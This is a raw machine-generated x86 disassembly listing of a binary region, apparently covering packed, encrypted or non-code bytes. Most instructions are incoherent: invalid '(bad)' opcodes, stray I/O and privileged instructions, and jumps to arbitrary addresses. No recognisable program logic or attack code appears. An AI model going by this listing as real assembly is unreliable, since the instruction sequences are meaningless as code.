  4061cb:	dec    ecx
  4061cc:	jmp    DWORD PTR [edi+0x4b]
  4061cf:	or     al,BYTE PTR [eax]
  4061d1:	or     dh,0x5d
  4061d4:	pop    es
  4061d5:	call   0x3f5707
  4061da:	xor    edx,ebx
  4061dc:	xor    DWORD PTR [ecx+0x49],eax
  4061df:	bound  esp,QWORD PTR [edx+esi*1+0x2680a88]
  4061e6:	sbb    DWORD PTR [edx],ecx
  4061e8:	cmp    bh,0x64
  4061eb:	add    ch,al
  4061ed:	gs int3 
  4061ef:	repz (bad) 
  4061f1:	push   0x4138ac
  4061f6:	popa   
  4061f7:	lea    esi,[edx]
  4061f9:	inc    ecx
  4061fa:	lock pop edi
  4061fc:	jmp    0x4061ff
	...
  40620e:	add    BYTE PTR [eax],al
  406210:	lock pop edi
  406212:	cmp    edi,0x7d
  406215:	ja     0x406282
  406217:	dec    esi
  406218:	in     eax,dx
  406219:	ins    BYTE PTR es:[edi],dx
  40621a:	je     0x406286
  40621c:	or     dh,BYTE PTR [ebp-0x12]
  40621f:	pop    es
  406220:	enter  0x7566,0xff
  406224:	xlat   BYTE PTR ds:[ebx]
  406225:	fldenv [eax]
  406227:	inc    DWORD PTR [ebp+0x78]
  40622a:	imul   edi,edi,0xffffffc5
  40622d:	push   esp
  40622e:	je     0x40629a
  406230:	fdivr  QWORD PTR [esi+ebp*8]
  406233:	pop    es
  406234:	enter  0x76aa,0xff
  406238:	scas   eax,DWORD PTR es:[edi]
  406239:	lods   al,BYTE PTR ds:[esi]
  40623a:	out    dx,al
  40623b:	sti    
  40623c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40623d:	sub    cl,BYTE PTR [eax+ebp*8]
  406240:	daa    
  406241:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406242:	je     0x406243
  406244:	test   eax,0x24ffffa1
  406249:	stc    
  40624a:	add    WORD PTR ds:0x13740364,0x8
  406252:	xor    esi,DWORD PTR es:[ecx]
  406255:	pusha  
  406256:	je     0x4062cd
  406258:	cld    
  406259:	xchg   edi,eax
  40625a:	cmc    
  40625b:	leave  
  40625c:	addr16 hlt 
  40625e:	shl    BYTE PTR [edi-0x10],cl
  406261:	pop    edi
  406262:	fs mov esi,0x7ede4c0
  406268:	pop    eax
  406269:	test   eax,0xc747ff6b
  40626e:	inc    edi
  40626f:	(bad)  
  406270:	aas    
  406271:	mov    esp,0x3eea
	...
  406286:	add    ebx,DWORD PTR [edi+0x5ba5ff03]
  40628c:	imul   ebx,DWORD PTR [ebp+0x3a],0x34
  406290:	je     0x4062e2
  406292:	mov    BYTE PTR [esi+0x3],bl
  406295:	out    dx,eax
  406296:	push   esi
  406297:	push   es
  406298:	mov    ecx,0x10fe8574
  40629d:	call   0x444a:0x6b166d18
  4062a4:	push   cs
  4062a5:	je     0x40622f
  4062a7:	fdivr  DWORD PTR [ecx+0x746defc2]
  4062ad:	pop    es
  4062ae:	fsubr  DWORD PTR [ebx]
  4062b0:	and    esi,DWORD PTR [edi+ebx*8-0x29]
  4062b4:	add    BYTE PTR [ecx],0xf0
  4062b7:	pop    ebx
  4062b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062b9:	aam    0xce
  4062bb:	repnz lock pop ebx
  4062be:	dec    eax
  4062bf:	pop    edi
  4062c0:	(bad)  
  4062c1:	jae    0x40628b
  4062c3:	jle    0x40626c
  4062c5:	jae    0x40627e
  4062c7:	ds stos DWORD PTR es:[edi],eax
  4062c9:	cld    
  4062ca:	scas   eax,DWORD PTR es:[edi]
  4062cb:	shl    DWORD PTR [ecx+0x60],cl
  4062ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062cf:	repnz in al,0x5b
  4062d2:	test   eax,0xeb73ae41
  4062d7:	inc    esi
  4062d8:	sbb    eax,0xda28180e
  4062dd:	les    eax,FWORD PTR [edi-0x562d7f44]
  4062e3:	ins    BYTE PTR es:[edi],dx
  4062e4:	mov    ss,esp
  4062e6:	daa    
  4062e7:	ins    BYTE PTR es:[edi],dx
  4062e8:	cld    
  4062e9:	sti    
	...
  4062fa:	add    BYTE PTR [eax],al
  4062fc:	push   edi
  4062fd:	fstp   TBYTE PTR [ebp+0x73]
  406300:	addr16 pop edi
  406302:	adc    eax,0xa06c5f4a
  406307:	inc    esi
  406308:	call   0x5cbf1f13
  40630d:	mov    BYTE PTR ds:0x5606da64,ah
  406313:	stc    
  406314:	out    dx,eax
  406315:	imul   edx,esp,0xffffffff
  406318:	ss xor dl,ah
  40631b:	sbb    al,0xb1
  40631d:	push   es
  40631e:	push   ecx
  40631f:	fstp   TBYTE PTR [eax]
  406321:	ins    BYTE PTR es:[edi],dx
  406322:	add    BYTE PTR [esi],dh
  406324:	popf   
  406325:	shl    ebx,0xc3
  406328:	repz imul esi,DWORD PTR [ebp-0x3],0xffffff82
  40632d:	icebp  
  40632e:	or     ebx,DWORD PTR [esi]
  406330:	leave  
  406331:	fldcw  WORD PTR [eax]
  406333:	test   al,0xf3
  406335:	pop    esi
  406336:	inc    ecx
  406337:	and    BYTE PTR [ebx+0x5fac896b],al
  40633d:	loope  0x40633e
  40633f:	std    
  406340:	call   0xdfbd6258
  406345:	ins    BYTE PTR es:[edi],dx
  406346:	xor    eax,0xffc5f47c
  40634b:	shr    dh,1
  40634d:	cmp    eax,0xc244deff
  406352:	mul    DWORD PTR [eax+ebp*4+0x63]
  406356:	push   eax
  406357:	into   
  406358:	mov    eax,0xf03cff0f
  40635d:	imul   esi,DWORD PTR ds:0x4c,0x0
	...
  406370:	add    BYTE PTR [eax],al
  406372:	add    eax,0x6c0ffc6
  406377:	jmp    FWORD PTR ds:[esi+0x13efc214]
  40637e:	hlt    
  40637f:	imul   esi,DWORD PTR [ebp-0x37],0x2
  406383:	repnz or edx,DWORD PTR [esi+0x2828d9b8]
  40638a:	in     al,dx
  40638b:	pop    esi
  40638c:	std    
  40638d:	mov    cl,0xe2
  40638f:	imul   ecx,DWORD PTR [ecx+0x4579d024],0xffffff89
  406396:	inc    ebx
  406397:	ins    BYTE PTR es:[edi],dx
  406398:	jne    0x40635f
  40639a:	loop   0x40638d
  40639c:	or     esp,DWORD PTR [esi+0x8]
  40639f:	fisubr DWORD PTR [eax]
  4063a1:	test   al,0xf3
  4063a3:	pop    esi
  4063a4:	in     eax,0x21
  4063a6:	ret    0x896b
  4063a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063aa:	iret   
  4063ab:	xchg   DWORD PTR [ebp+0x0],edi
  4063ae:	mov    ch,0x7
  4063b0:	je     0x406b73
  4063b6:	mov    dh,BYTE PTR [esi-0x9]
  4063b9:	add    BYTE PTR [esi],dh
  4063bb:	or     DWORD PTR [edx-0x7cf8e700],0x7d
  4063c2:	fld    QWORD PTR [edi]
  4063c4:	je     0x406b53
  4063ca:	out    0x6e,al
  4063cc:	daa    
  4063cd:	jmp    FWORD PTR [esi+ebp*2-0x19]
  4063d1:	sub    bl,BYTE PTR [ebx]
  4063d3:	cmc    
  4063d4:	(bad)  
  4063d5:	inc    DWORD PTR [eax]
	...
  4063e7:	add    BYTE PTR [edx+ebx*8-0x2],bl
  4063eb:	jne    0x4063be
  4063ed:	into   
  4063ee:	add    dl,0xd6
  4063f1:	clc    
  4063f2:	(bad)  
  4063f3:	jne    0x4063c6
  4063f5:	clc    
  4063f6:	je     0x406400
  4063f8:	mov    cl,0x6d
  4063fa:	sar    edi,0xa6
  4063fd:	clc    
  4063fe:	je     0x4063f4
  406400:	mov    dh,0x72
  406402:	pop    es
  406403:	call   0x3f254a
  406408:	or     BYTE PTR [edx+0x27],bl
  40640b:	adc    ecx,DWORD PTR [ecx-0x7b8a4219]
  406411:	div    DWORD PTR [eax+esi*8+0x66]
  406415:	jb     0x40641e
  406417:	call   0x3f24da
  40641c:	jb     0x406423
  40641e:	push   DWORD PTR [ebp-0x7f]
  406421:	clc    
  406422:	je     0x406414
  406424:	out    0x71,al
  406426:	pop    es
  406427:	call   0x3f286e
  40642c:	(bad)  
  40642d:	jno    0x40641a
  40642f:	jmp    FWORD PTR [esi+ebp*2]
  406432:	out    0x3c,eax
  406434:	sbb    edi,eax
  406436:	inc    BYTE PTR [ebx+0x6752f0]
  40643c:	mov    esp,0x107d8472
  406441:	pop    esp
  406442:	test   BYTE PTR [esi],0x7b
  406445:	mov    ds:0x30e0ff67,eax
  40644a:	test   DWORD PTR [edi],0x0
	...
  40645c:	add    BYTE PTR [eax],al
  40645e:	or     BYTE PTR [edi],bl
  406460:	inc    ebx
  406461:	dec    DWORD PTR [edi]
  406463:	adc    eax,0x8f069fe
  406468:	test   DWORD PTR [edi],0xff42cb08
  40646e:	idiv   eax
  406470:	div    bl
  406472:	fdivr  DWORD PTR [ebx]
  406474:	inc    esi
  406475:	jmp    edi
  406477:	push   0x53c8fbf6
  40647c:	inc    esi
  40647d:	call   edi
  40647f:	pop    eax
  406480:	div    bh
  406482:	fsubr  DWORD PTR [ebx+0x46]
  406485:	inc    edi
  406487:	dec    eax
  406488:	imul   bh
  40648a:	enter  0x4663,0xff
  40648e:	mov    bh,0x38
  406490:	imul   bl
  406492:	cwde   
  406493:	pop    ebx
  406494:	inc    esi
  406495:	jmp    DWORD PTR [edi-0x771c0958]
  40649b:	mov    bl,0x47
  40649d:	call   DWORD PTR [edi-0xfdbba5a]
  4064a3:	sub    bh,BYTE PTR [ebp-0x14]
  4064a6:	jno    0x40644b
  4064a8:	jae    0x4064a1
  4064aa:	jg     0x40643c
  4064ac:	fist   DWORD PTR [edx]
  4064ae:	lock call 0xace9cd64
  4064b4:	ret    0xcfff
  4064b7:	mov    ecx,0x7f04133
  4064bc:	fwait
  4064bd:	xor    esi,DWORD PTR [ecx+0x9edb5f]
	...
  4064d3:	add    BYTE PTR [ebx],al
  4064d5:	pop    es
  4064d6:	test   al,0x3
  4064d8:	fmul   DWORD PTR [edx+ebx*1-0x731ec03d]
  4064df:	xor    al,0xb1
  4064e1:	push   es
  4064e2:	dec    esi
  4064e3:	idiv   bl
  4064e5:	imul   edi,DWORD PTR [ebx+edi*8+0x703edf0f],0x3d9de1f
  4064f0:	pop    es
  4064f1:	test   al,0xc1
  4064f3:	ins    DWORD PTR es:[edi],dx
  4064f4:	ret    
  4064f5:	(bad)  
  4064f6:	call   0xa87561d6
  4064fb:	add    ecx,DWORD PTR [eax-0x83d25a1]
  406501:	loopne 0x40653a
  406503:	xor    al,0x31
  406505:	pop    es
  406506:	xchg   ecx,eax
  406507:	inc    esi
  406508:	and    eax,esi
  40650a:	call   0xa87521ea
  40650f:	add    edx,edi
  406511:	repnz fdiv QWORD PTR [eax+0x45]
  406515:	call   eax
  406517:	sub    eax,esi
  406519:	push   0x6e3dcde
  40651e:	(bad)  
  40651f:	scas   al,BYTE PTR es:[edi]
  406520:	dec    eax
  406521:	int    0x14
  406523:	lds    ebp,FWORD PTR [edi+0x31382fe0]
  406529:	pop    es
  40652a:	push   ecx
  40652b:	sub    al,0xe4
  40652d:	(bad)
  406530:	std    
  406531:	xor    ch,BYTE PTR [eax]
  406533:	add    al,0x18
  406535:	add    bl,ch
  406537:	les    eax,FWORD PTR [eax]
	...
  406549:	add    BYTE PTR [edi+0x3137c5e0],al
  40654f:	pop    es
  406550:	xchg   esi,eax
  406551:	stc    
  406552:	jmp    0x4065bb
  406554:	adc    al,0xfc
  406556:	push   edi
  406557:	cli    
  406558:	xchg   BYTE PTR [edi+0x67],ch
  40655b:	jp     0x406581
  40655d:	jo     0x40651f
  40655f:	addr16 add ah,bh
  406562:	push   edi
  406563:	imul   esi,DWORD PTR ds:0xffc5ecfc,0x918350
  40656d:	jmp    0xd3b60dac
  406572:	scas   al,BYTE PTR es:[edi]
  406573:	shl    edi,0xe9
  406576:	repz push es
  406578:	add    BYTE PTR [esi],ch
  40657a:	cmp    DWORD PTR [edi+edi*8-0x1a],esi
  40657e:	repz push es
  406580:	push   0xffffffe9
  406582:	cmp    DWORD PTR [eax+0x69],ebp
  406585:	jmp    0xaccccdb3
  40658a:	jg     0x406562
  40658c:	mov    WORD PTR [eax+edi*2+0x6f],fs
  406590:	call   DWORD PTR [esi]
  406592:	sbb    al,0x69
  406594:	jne    0x4065a7
  406596:	pop    edi
  406597:	repnz sti 
  406599:	adc    DWORD PTR [ebp-0x6f],esp
  40659c:	add    cl,ch
  40659e:	fisub  DWORD PTR [edi-0x38c5148c]
  4065a4:	addr16 paddsb mm0,mm5
  4065a8:	jmp    ebp
  4065aa:	enter  0xe7fb,0x8e
	...
  4065be:	add    BYTE PTR [eax],al
  4065c0:	ss push 0x7a2362ff
  4065c6:	test   ebp,edx
  4065c8:	es push 0x5fc219ff
  4065ce:	hlt    
  4065cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065d0:	push   cs
  4065d1:	push   0x70236c89
  4065d6:	jmp    FWORD PTR [esi-0x610f4de2]
  4065dc:	push   ss
  4065dd:	push   0x5f7c14ff
  4065e2:	cmc    
  4065e3:	xchg   edi,eax
  4065e4:	push   es
  4065e5:	push   0x6fe354ff
  4065ea:	inc    DWORD PTR [eax]
  4065ec:	outs   dx,BYTE PTR ds:[esi]
  4065ed:	retf   
  4065ee:	loope  0x4065b3
  4065f0:	(bad)  
  4065f2:	inc    BYTE PTR [ebp-0x1f]
  4065f5:	int3   
  4065f6:	xchg   esp,eax
  4065f7:	inc    DWORD PTR [edi+edx*8-0x19]
  4065fb:	das    
  4065fc:	mov    DWORD PTR [ebx],0x6c0bc900
  406602:	call   DWORD PTR [edx+edx*8-0x39]
  406606:	add    ah,0xbd
  406609:	dec    ebp
  40660a:	jmp    FWORD PTR [ecx+0x17]
  40660d:	fdiv   DWORD PTR [eax+ecx*1-0x3f]
  406611:	lock mov edi,0x44eadeff
  406617:	cld    
  406618:	xor    DWORD PTR [edx+0x32],esp
  40661b:	inc    ecx
  40661c:	sbb    eax,ebx
  40661e:	je     0x406628
  406620:	loope  0x4065d2
  406622:	(bad)  
  406623:	inc    DWORD PTR [eax]
	...
  406635:	add    dh,bl
  406637:	dec    ebp
  406638:	jmp    DWORD PTR [edi+0x4f]
  40663b:	sbb    DWORD PTR [ecx+0x0],eax
  40663e:	sub    DWORD PTR [ebx+0x32],0x34f5c941
  406645:	ins    DWORD PTR es:[edi],dx
  406646:	mov    al,0x4b
  406648:	jmp    edi
  40664a:	or     esp,ecx
  40664c:	(bad)  
  40664d:	inc    edx
  40664f:	retf   0xf73
  406652:	stc    
  406653:	cmp    bh,dh
  406655:	jne    0x406628
  406657:	ret    0xfc94
  40665a:	mov    esi,0x5a85e7f4
  40665f:	hlt    
  406660:	(bad)  
  406661:	push   0xffffff89
  406663:	inc    edx
  406664:	fild   QWORD PTR [eax]
  406666:	enter  0x680a,0x74
  40666a:	mov    cl,BYTE PTR [ecx-0x1]
  40666d:	(bad)  
  40666e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40666f:	inc    ebp
  406670:	sub    BYTE PTR [ecx-0x77],al
  406673:	ret    0xc685
  406676:	lock jl 0x4066e6
  406679:	or     esi,DWORD PTR [eax]
  40667b:	cld    
  40667c:	cld    
  40667d:	dec    edi
  40667e:	ror    BYTE PTR [edi+esi*8+0x6ff94807],0xff
  406686:	push   edi
  406687:	mov    cl,cl
  406689:	ret    0xf54f
  40668c:	fcos   
  40668e:	iret   
  40668f:	fnsave [eax]
  406691:	inc    ecx
  406692:	lock aaa 
  406694:	loop   0x4066c8
  406696:	mov    cl,0x6f
  406698:	fild   DWORD PTR [ecx]
	...
  4066aa:	add    BYTE PTR [eax],al
  4066ac:	lock outs dx,DWORD PTR ds:[esi]
  4066ae:	sub    eax,0xffffffc5
  4066b1:	xor    eax,0x2febff6d
  4066b6:	clc    
  4066b7:	push   cs
  4066b8:	sar    BYTE PTR [edi+0x6c],0x75
  4066bc:	clc    
  4066bd:	mov    ecx,0x5c2d07fb
  4066c3:	xor    dh,BYTE PTR [ebx]
  4066c5:	add    eax,0x87f06a6d
  4066ca:	arpl   WORD PTR [eax],bp
  4066cc:	xor    DWORD PTR [eax-0x25],esi
  4066cf:	jae    0x4066f4
  4066d1:	scas   eax,DWORD PTR es:[edi]
  4066d2:	add    ebp,DWORD PTR [eax-0xe]
  4066d5:	outs   dx,DWORD PTR ds:[esi]
  4066d6:	add    eax,DWORD PTR [eax-0xba5c38]
  4066dc:	iret   
  4066dd:	push   0x1ff77443
  4066e2:	aam    0xfe
  4066e4:	inc    ebp
  4066e5:	pop    eax
  4066e6:	pop    ebx
  4066e7:	sbb    DWORD PTR [esp+edi*1-0x4f061794],esi
  4066ee:	ins    BYTE PTR es:[edi],dx
  4066ef:	call   FWORD PTR [edx]
  4066f1:	push   0x6c
  4066f3:	jne    0x4066dd
  4066f5:	aaa    
  4066f6:	jmp    0xd9dcfef6
  4066fb:	and    cl,BYTE PTR [edi+0xe7fc1a]
  406701:	pop    es
  406702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406703:	ins    BYTE PTR es:[edi],dx
  406704:	jg     0x4066f6
  406706:	cld    
  406707:	ins    BYTE PTR es:[edi],dx
  406708:	std    
  406709:	push   cs
  40670a:	and    ebp,0x6c8e656b
	...
  406720:	add    BYTE PTR [eax],al
  406722:	frstor [edx-0x7a]
  406725:	div    bh
  406727:	outs   dx,BYTE PTR ds:[esi]
  406728:	pop    ds
  406729:	inc    esp
  40672a:	push   edi
  40672b:	mov    al,gs:0x1406f441
  406731:	jns    0x406787
  406733:	mov    DWORD PTR ds:0xd2bda66f,ebp
  406739:	add    ecx,edx
  40673b:	or     eax,0x6ef7f656
  406740:	jmp    0x70a58e88
  406745:	(bad)  
  406746:	sbb    edx,DWORD PTR [ecx-0x38377a0c]
  40674c:	call   0x1d134c9
  406751:	ret    
  406752:	pop    es
  406753:	in     eax,0xe5
  406755:	add    eax,DWORD PTR [ecx+ebx*8-0x383c2770]
  40675c:	call   0x740b3f35
  406761:	add    esi,eax
  406763:	movaps xmm7,xmm6
  406766:	(bad)  
  406767:	mov    esp,0x64abdb10
  40676c:	not    dl
  40676e:	push   edi
  40676f:	pop    es
  406770:	jmp    0x6e2fedd1
  406775:	xor    BYTE PTR [ecx],dh
  406777:	pop    es
  406778:	cmp    DWORD PTR [ebx+0x3d],ebp
  40677b:	xadd   esi,ecx
  40677e:	xchg   esi,eax
  40677f:	fs into 
  406781:	pop    esp
  406782:	outs   dx,BYTE PTR ds:[esi]
  406783:	dec    ecx
  406784:	(bad)  
  406785:	imul   eax,DWORD PTR [eax],0x0
	...
  406798:	or     dh,bl
  40679a:	hlt    
  40679b:	les    edx,FWORD PTR [edi-0x1c3f0043]
  4067a1:	jns    0x4067a3
  4067a3:	jmp    0x6b50c2e
  4067a8:	mov    ds:0xbad3a6c,al
  4067ad:	fs push eax
  4067af:	add    esp,esi
  4067b1:	push   es
  4067b2:	out    dx,eax
  4067b3:	dec    edi
  4067b4:	inc    esp
  4067b5:	lea    esi,[eax+ebp*1]
  4067b8:	hlt    
  4067b9:	mov    dh,0xfe
  4067bb:	hlt    
  4067bc:	pop    ebx
  4067bd:	ins    BYTE PTR es:[edi],dx
  4067be:	sub    al,0x8e
  4067c0:	(bad)  [ebx-0x18]
  4067c3:	adc    DWORD PTR [esi-0xaad009d],ebp
  4067c9:	int3   
  4067ca:	jg     0x4067eb
  4067cc:	in     al,dx
  4067cd:	fyl2xp1 
  4067cf:	scas   eax,DWORD PTR es:[edi]
  4067d0:	xchg   edi,eax
  4067d1:	pop    ss
  4067d2:	rcl    BYTE PTR [eax+0x46ff639b],0xa6
  4067d9:	mov    ah,0x38
  4067db:	out    0x20,al
  4067dd:	xchg   ebx,eax
  4067de:	(bad)  
  4067df:	mov    esp,0xe1756397
  4067e4:	stos   DWORD PTR es:[edi],eax
  4067e5:	call   0x305d:0xc38b26bf
  4067ec:	scas   al,BYTE PTR es:[edi]
  4067ed:	or     al,BYTE PTR [eax]
  4067ef:	mov    esp,0xe968736e
  4067f4:	repz jae 0x4067b5
  4067f7:	xchg   ecx,eax
  4067f8:	jl     0x406814
  4067fa:	inc    ecx
  4067fb:	jmp    0x406800
	...
  40680c:	add    BYTE PTR [eax],al
  40680e:	dec    edx
  40680f:	fimul  DWORD PTR [ebx]
  406811:	test   al,0xb
  406814:	call   0xffa4ba1f
  406819:	push   ecx
  40681a:	cmc    
  40681b:	push   es
  40681c:	out    dx,eax
  40681d:	lahf   
  40681e:	fwait
  40681f:	mov    cl,0x34
  406821:	sub    ah,dh
  406823:	arpl   WORD PTR [ebp-0x23],si
  406826:	sbb    bl,dl
  406828:	pop    es
  406829:	add    cl,al
  40682b:	mov    ecx,0x2256ffe5
  406830:	ret    0x9908
  406833:	ss mov ch,ah
  406836:	push   esi
  406837:	push   esi
  406838:	or     ebp,eax
  40683a:	retf   0xfec8
  40683d:	inc    DWORD PTR [edx-0xee58c39]
  406843:	jnp    0x406879
  406845:	inc    ecx
  406846:	pop    ecx
  406847:	aaa    
  406848:	out    0xd8,eax
  40684a:	mov    eax,?
  40684c:	(bad)  
  40684d:	push   eax
  40684e:	stc    
  40684f:	out    dx,eax
  406850:	je     0x40685a
  406852:	jno    0x4067d8
  406854:	(bad)  
  406855:	call   esi
  406857:	mov    edi,0xf0d6c1d5
  40685c:	enter  0x41c2,0x7
  406860:	push   ebp
  406861:	mov    esi,DWORD PTR [ebp+0x33fcc48c]
  406867:	pop    es
  406868:	push   0x8
  40686a:	mov    dh,0x56
  40686c:	pop    es
  40686d:	call   0x401623
	...
  406882:	add    BYTE PTR [eax],al
  406884:	nop
  406885:	inc    esi
  406886:	sti    
  406887:	push   0x19
  406889:	aas    
  40688a:	test   DWORD PTR ds:0xb3680748,esi
  406890:	sbb    eax,0xccfeff4a
  406895:	aas    
  406896:	sub    BYTE PTR [ecx-0x27],al
  406899:	mov    esi,0xecf6c4bd
  40689e:	or     al,al
  4068a0:	pop    ebp
  4068a1:	adc    dl,BYTE PTR [eax+0x68]
  4068a4:	fadd   DWORD PTR [esi]
  4068a6:	out    dx,eax
  4068a7:	mov    esi,0x874ed69
  4068ac:	mov    eax,ds:0x96ffe26a
  4068b1:	ret    
  4068b2:	(bad)  
  4068b3:	shl    eax,0x38
  4068b6:	imul   ebp,DWORD PTR [edx-0x10],0x313581c7
  4068bd:	jo     0x40689a
  4068bf:	xlat   BYTE PTR ds:[ebx]
  4068c0:	fsubr  QWORD PTR [esi]
  4068c2:	add    al,0xff
  4068c4:	(bad)
  4068c7:	inc    ecx
  4068c8:	lock inc edi
  4068ca:	jns    0x406890
  4068cc:	jg     0x406877
  4068ce:	std    
  4068cf:	mov    edi,0x67d35bfc
  4068d4:	icebp  
  4068d5:	outs   dx,DWORD PTR ds:[esi]
  4068d6:	pop    eax
  4068d7:	mov    esi,0x7ef90c0
  4068dc:	dec    eax
  4068dd:	sbb    ah,BYTE PTR [ebp-0x1]
  4068e0:	push   edi
  4068e1:	js     0x4068ac
  4068e3:	ror    BYTE PTR [edi-0x27],0xdd
  4068e7:	inc    DWORD PTR [eax]
	...
  4068f9:	add    bh,cl
  4068fb:	mov    ecx,0x37f0412e
  406900:	adc    eax,0x686fb135
  406905:	xor    eax,0xffc3069d
  40690a:	(bad)  
  40690c:	aas    
  40690d:	call   FWORD PTR [edi]
  40690f:	push   ebp
  406910:	inc    ebx
  406911:	je     0x4068fa
  406913:	jg     0x4068e8
  406915:	inc    BYTE PTR [ebp+0x70a5b67]
  40691b:	xor    DWORD PTR [ecx-0x18],ebp
  40691e:	lds    ebp,FWORD PTR [esi]
  406920:	imul   edi,edi,0x95db6f8a
  406926:	and    eax,0x2a6803af
  40692b:	cmp    eax,edx
  40692d:	(bad)  
  40692e:	fisub  WORD PTR [edx+0x703128d6]
  406934:	pop    ebx
  406935:	ss mov ah,0x58
  406938:	push   0xf7dbb00b
  40693d:	dec    edi
  40693e:	and    BYTE PTR [edi],al
  406940:	out    0xee,al
  406942:	out    dx,eax
  406943:	outs   dx,BYTE PTR ds:[esi]
  406944:	leave  
  406945:	imul   ebp,DWORD PTR [edi-0x4f033e9f],0x9fddce61
  40694f:	jmp    0x77197b9
  406954:	push   ecx
  406955:	icebp  
  406956:	(bad)  
  406957:	(bad)  
  406958:	call   0x3426c5
  40695d:	ret    0x0
	...
  406970:	jg     0x4069db
  406972:	cmc    
  406973:	aas    
  406974:	ja     0x4069d7
  406976:	repnz inc ebx
  406978:	in     al,0x11
  40697a:	cmp    esp,edx
  40697c:	data16 fneni(8087 only) 
  40697f:	pop    ebx
  406980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406981:	pusha  
  406982:	xchg   BYTE PTR [eax+0x48],ch
  406985:	addr16 test eax,0xd4ec4f68
  40698b:	push   0x4b810ebd
  406990:	ds popa 
  406992:	data16 fstp st(1)
  406995:	popa   
  406996:	aam    0xfb
  406998:	pop    ss
  406999:	push   eax
  40699a:	push   edi
  40699b:	push   0x6909ec27
  4069a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069a1:	push   cs
  4069a2:	push   ecx
  4069a3:	aas    
  4069a4:	push   ss
  4069a5:	popa   
  4069a6:	ds push 0xee366285
  4069ac:	out    dx,eax
  4069ad:	outs   dx,BYTE PTR ds:[esi]
  4069ae:	imul   DWORD PTR [ecx+0x453060ff]
  4069b4:	in     al,dx
  4069b5:	push   es
  4069b6:	mov    ah,0x7c
  4069b8:	fsub   QWORD PTR [eax-0x64]
  4069bb:	test   edi,0xdf68255f
  4069c1:	or     al,0x29
  4069c3:	out    dx,eax
  4069c4:	and    eax,0x312e38ef
  4069c9:	pop    es
  4069ca:	add    BYTE PTR [ecx-0x113b6dd5],bl
  4069d0:	push   edi
  4069d1:	mov    bh,0x4f
  4069d3:	cmp    DWORD PTR [eax],eax
	...
  4069e5:	add    BYTE PTR [eax+eiz*2-0x10a93101],dl
  4069ec:	stos   BYTE PTR es:[edi],al
  4069ed:	sbb    al,0xad
  4069ef:	pusha  
  4069f0:	dec    edi
  4069f1:	into   
  4069f2:	mov    eax,ds:0x111ae808
  4069f7:	pusha  
  4069f8:	jmp    DWORD PTR [ecx]
  4069fa:	lods   al,BYTE PTR ds:[esi]
  4069fb:	pop    es
  4069fc:	add    dh,al
  4069fe:	dec    esi
  4069ff:	out    dx,eax
  406a00:	mov    ecx,0x4f60b4f4
  406a05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a06:	or     DWORD PTR [eax],0x5fd0dee8
  406a0c:	push   DWORD PTR [ecx]
  406a0e:	inc    esp
  406a0f:	push   es
  406a10:	add    BYTE PTR [esi-0x6a],bh
  406a13:	out    dx,eax
  406a14:	(bad)  
  406a15:	mov    esp,0x7e4f602c
  406a1a:	inc    ecx
  406a1b:	or     al,ch
  406a1d:	ret    0x5fd0
  406a20:	inc    DWORD PTR [ecx+0x66ffa02f]
  406a26:	cmc    
  406a27:	inc    esp
  406a28:	or     cl,ch
  406a2a:	inc    eax
  406a2b:	(bad)  
  406a2c:	in     al,dx
  406a2d:	push   0xffffffb0
  406a2f:	bound  ebp,QWORD PTR [edx-0x17]
  406a32:	cmp    DWORD PTR [edi],ecx
  406a34:	(bad)  
  406a35:	mov    esp,0x7c79681b
  406a3a:	xchg   edi,eax
  406a3b:	pop    edi
  406a3c:	mov    DWORD PTR [edi+ecx*4+0x12e19ec],ebp
  406a43:	or     al,ch
  406a45:	imul   ecx,DWORD PTR [edi+0x93ff5f],0x0
	...
  406a5b:	add    BYTE PTR [edx],dl
  406a5d:	pusha  
  406a5e:	jne    0x406a41
  406a60:	dec    ebx
  406a61:	fsin   
  406a63:	push   cs
  406a64:	push   edi
  406a65:	in     eax,dx
  406a66:	sbb    eax,DWORD PTR [eax]
  406a68:	out    dx,al
  406a69:	push   ebp
  406a6a:	pop    es
  406a6b:	call   0x3f52ed
  406a70:	mov    esi,0x44fffb56
  406a75:	pop    esp
  406a76:	out    0x93,eax
  406a78:	mov    eax,gs
  406a7a:	dec    cl
  406a7c:	pop    ebx
  406a7d:	pop    edi
  406a7e:	call   DWORD PTR [edx+edx*1-0x48]
  406a82:	imul   eax,DWORD PTR [eax],0x41360631
  406a88:	mov    DWORD PTR [ebx],edi
  406a8a:	repnz xor eax,0x35ff0ad8
  406a90:	sub    al,0x2
  406a92:	inc    ecx
  406a93:	add    BYTE PTR [ecx+0x4effc258],dh
  406a99:	pop    esp
  406a9a:	mov    edi,0xfe336474
  406a9f:	jne    0x406b0a
  406aa1:	call   0xe859771a
  406aa6:	je     0x406ab0
  406aa8:	adc    DWORD PTR [ebp-0x4431001c],0xe8bebfdd
  406ab2:	imul   eax,DWORD PTR [eax],0x413605f1
  406ab8:	dec    ecx
  406ab9:	cmp    esi,edx
  406abb:	xor    eax,0x2680358
	...
  406ad0:	add    BYTE PTR [eax],al
  406ad2:	sbb    DWORD PTR [ebx],eax
  406ad4:	sub    al,0xa9
  406ad7:	(bad)  
  406ada:	and    al,bl
  406adc:	jae    0x406af3
  406ade:	imul   ebp,eax,0x56be1074
  406ae4:	or     edx,DWORD PTR [eax-0x32]
  406ae7:	push   esi
  406ae8:	pop    es
  406ae9:	call   0x3f2a78
  406aee:	add    DWORD PTR [ebp-0x41],esi
  406af1:	push   eax
  406af3:	hlt    
  406af4:	gs jne 0x406af7
  406af7:	or     eax,0xf7480bf0
  406afc:	das    
  406afd:	inc    ecx
  406afe:	lock pop esp
  406b00:	out    dx,eax
  406b01:	pop    es
  406b02:	fcomp  DWORD PTR [esi]
  406b04:	pop    edi
  406b05:	(bad)  
  406b06:	mov    edi,0xf00c4127
  406b0b:	sbb    bh,BYTE PTR [ecx-0x14]
  406b0e:	jae    0x406ab4
  406b10:	push   0xf9c9f06a
